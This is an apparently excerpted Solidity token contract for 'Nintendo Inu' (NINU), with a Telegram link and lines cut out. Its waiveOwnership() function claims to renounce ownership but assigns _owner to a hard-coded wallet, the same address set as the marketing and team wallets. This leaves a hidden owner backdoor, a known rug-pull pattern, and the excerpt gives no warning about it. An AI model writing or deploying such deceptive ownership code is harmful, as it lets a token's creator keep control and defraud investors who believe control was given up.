...
/**
Telegram : https://t.me/NintendoInu
*/
...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0x591caFA002a0692cc50BAA3786B12df4c953d139);
    }
...
contract NintendoInu is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "Nintendo Inu";
    string private _symbol = "NINU";
    uint8 private _decimals = 9;

    address payable private marketingWalletAddress = payable(0x591caFA002a0692cc50BAA3786B12df4c953d139);
    address payable private teamWalletAddress = payable(0x591caFA002a0692cc50BAA3786B12df4c953d139);
